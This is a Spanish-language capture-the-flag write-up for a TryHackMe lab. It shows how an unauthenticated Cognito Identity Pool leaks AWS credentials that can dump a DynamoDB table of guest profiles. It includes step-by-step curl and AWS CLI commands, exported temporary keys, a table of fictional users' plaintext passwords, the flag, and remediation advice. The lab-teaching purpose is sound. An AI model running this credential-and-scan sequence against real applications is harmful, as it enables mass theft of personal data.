# Reporte de Laboratorio — Byte Lotus Wellness (Complimentary)

**Plataforma:** TryHackMe · **Tipo:** Vulnerabilidad de acceso en aplicación móvil/web
**Objetivo:** `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/`

---

## 1. Resumen

La app "Byte Lotus Wellness" se anuncia como sin fricción: **sin login, sin cuenta**, pero "conoce" datos del usuario al abrirse. Ese comportamiento no es magia: la app carga el SDK de AWS en el navegador y solicita **credenciales AWS temporales a un Cognito Identity Pool con acceso no autenticado**. Esas credenciales tienen permiso para leer (e incluso escanear) toda la tabla DynamoDB de perfiles de huéspedes, no solo el registro del visitante. Resultado: cualquiera puede volcar los datos de todos los huéspedes, incluida la flag.

**Flag:** `THM{fr33_app_fr33_d4t4!}`

---

## 2. Clasificación de la vulnerabilidad

| Marco | Referencia | Aplicación |
|-------|-----------|------------|
| OWASP Top 10 (2021) | **A01:2021 Broken Access Control** | El rol invitado accede a todos los perfiles, no solo al suyo |
| OWASP Top 10 (2021) | **A05:2021 Security Misconfiguration** | Identity Pool con "Allow unauthenticated" habilitado |
| CWE | **CWE-306** Missing Authentication for Critical Function | Cognito unauth expone credenciales AWS |
| CWE | **CWE-862** Missing Authorization | `dynamodb:Scan` sobre la tabla completa sin filtro por usuario |
| CWE | **CWE-732** Incorrect Permission Assignment for Critical Resource | Rol IAM de invitado sobre-permisivo |

**Mapeo MITRE ATT&CK (narrativa de ataque):**

| Paso | Técnica |
|------|---------|
| Descubrir el endpoint/recurso en la nube | `T1580` Cloud Infrastructure Discovery |
| Obtener credenciales válidas del pool Cognito | `T1078.004` Valid Accounts: Cloud Accounts |
| Reunir identidad de las víctimas desde la tabla | `T1589` Gather Victim Identity Information |
| Exfiltrar datos de almacenamiento en la nube | `T1530` Data from Cloud Storage |

---

## 3. Mecanismo que emite credenciales a escondidas

`app.js` (cargado por la página) contiene:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
// ...luego getItem({ TableName: TABLE_NAME, Key: { guest_id: ... } })
```

El navegador pide credenciales al Identity Pool **sin ningún login**. Cognito devuelve un par de claves AWS (`ASIA...`) firmadas con un token de sesión. El frontend solo usa `getItem` para su propio `guest_id`, pero **el rol IAM detrás del pool permite `Scan`**, por lo que no hay límite real a lo que esas credenciales pueden leer.

---

## 4. Pasos reproducibles

**4.1. Obtener un IdentityId (sin firmar, igual que el browser):**
```bash
curl -s -X POST "https://cognito-identity.us-east-1.amazonaws.com/" \
  -H "X-Amz-Target: ...AWSCognitoIdentityService.GetId" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -d '{"IdentityPoolId":"us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"}'
# => {"IdentityId":"us-east-1:4d571309-..."}
```

**4.2. Canjear por credenciales AWS temporales:**
```bash
curl -s -X POST "https://cognito-identity.us-east-1.amazonaws.com/" \
  -H "X-Amz-Target: ...AWSCognitoIdentityService.GetCredentialsForIdentity" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -d '{"IdentityId":"us-east-1:4d571309-..."}'
# => AccessKeyId / SecretKey / SessionToken
```

**4.3. Usarlas para escanear TODA la tabla (no solo mi registro):**
```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYHRXOX3XJ"
export AWS_SECRET_ACCESS_KEY="KksetecMBwjNh7PhjIrIVgpVIA6nh3z79OR0uCDS"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2Vj..."
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

**4.4. Resultado:** 5 perfiles completos (name, email, phone, password, location, notes), incluido `guest-vip-042` con la flag en su campo `notes`.

---

## 5. Datos expuestos

| guest_id | name | email | password |
|----------|------|-------|----------|
| guest-vibe | Vibe | vibe@hackerholidays.thm | digitaldetox2026 |
| guest-lambo | Lambo (@0xMia) | lambo@hackerholidays.thm | sunkissed88 |
| guest-vip-042 | Guest VIP-042 | vip042@hackerholidays.thm | escalation_only |
| guest-patch | Patch | patch@hackerholidays.thm | haveyoutriedrestarting |
| guest-ponzi | Ponzi | ponzi@hackerholidays.thm | notmykeys1 |

**Flag en `guest-vip-042.notes`:**
```
THM{fr33_app_fr33_d4t4!}
```

---

## 6. Impacto

- **Exposición total de PII** de todos los huéspedes (nombre, email, teléfono, ubicación GPS, notas privadas, contraseñas en texto claro).
- **Rotura de la frontera de autorización**: la app simula "usuario invitado" en el frontend, pero en la nube no hay control de acceso por objeto.
- Cualquier visitante anónimo obtiene credenciales AWS válidas y puede leer (y potencialmente escribir/eliminar) la tabla completa.

---

## 7. Remediación

1. **Deshabilitar acceso no autenticado** en el Cognito Identity Pool (`Allow unauthenticated identities = false`).
2. **Aplicar autorización por objeto** en DynamoDB: el rol invitado debe tener solo `dynamodb:GetItem`/`Query` limitado a su propio `guest_id` mediante **IAM policy con condición** (`dynamodb:LeadingKeys` = `${cognito-identity.amazonaws.com:sub}`), nunca `Scan`.
3. **No almacenar contraseñas** como atributo de tabla en texto claro; eliminar ese campo o usar hashing.
4. **No exponer el SDK de AWS en el cliente** para operaciones sobre datos de otros usuarios; mover el acceso a DynamoDB detrás de un backend con auth real.
5. **Cifrar datos sensibles** en reposo y revisar el alcance del rol IAM asociado al pool.

---

## 8. Lección

Exponer credenciales AWS no autenticadas (Cognito unauth) con permisos de tabla completa es equivalente a dejar la base de datos abierta al público. El "login opcional" solo es una ilusión de interfaz: la autorización real vive en el backend, y ahí no se estaba verificando nada.
